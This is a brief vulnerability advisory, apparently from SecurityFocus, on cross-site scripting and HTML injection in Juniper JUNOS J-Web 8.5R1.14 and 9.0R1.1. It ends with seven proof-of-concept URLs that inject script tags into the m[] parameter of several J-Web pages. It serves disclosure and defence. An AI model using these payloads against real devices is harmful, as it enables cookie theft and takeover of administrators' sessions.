source: https://www.securityfocus.com/bid/36537/info
    
Juniper Networks JUNOS is prone to multiple cross-site scripting and HTML-injection vulnerabilities because it fails to sufficiently sanitize user-supplied data to J-Web (Juniper Web Management).
    
Attacker-supplied HTML or JavaScript code could run in the context of the affected site, potentially allowing the attacker to steal cookie-based authentication credentials and to control how the site is rendered to the user; other attacks are also possible.
    
This issue affects the following:
    
J-Web 8.5R1.14
J-Web 9.0R1.1 

http://www.example.com/monitor?m[]='><script>alert(1)</script>
http://www.example.com/manage?m[]='><script>alert(1)</script>
http://www.example.com/events?m[]='><script>alert(1)</script>
http://www.example.com/configuration?m[]='><script>alert(1)</script>
http://www.example.com/alarms?m[]='><script>alert(1)</script>
http://www.example.com/?m[]='><script>alert(1)</script>
http://www.example.com/?action=browse&m[]="><script>alert(1)</SCRIPT>&path=/var/crash&